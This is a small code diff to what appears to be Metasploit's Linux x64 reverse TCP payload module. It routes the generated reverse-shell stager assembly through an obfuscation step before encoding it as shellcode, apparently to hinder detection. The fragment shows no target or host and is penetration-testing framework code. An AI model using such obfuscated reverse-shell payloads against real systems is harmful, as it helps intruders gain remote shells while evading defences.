@@ -13,6 +13,7 @@ module Payload::Linux::X64::ReverseTcp
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Linux::X64::Prepends
+  include Msf::Obfuscation::AssemblyObfuscation
 
   #
   # Generate the first stage
@@ -50,6 +51,7 @@ module Payload::Linux::X64::ReverseTcp
   #
   def generate_reverse_tcp(opts={})
     asm = asm_reverse_tcp(opts)
+    asm = obfuscate_assembly('x64', asm) if respond_to?(:obfuscate_assembly)
     Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
   end
 
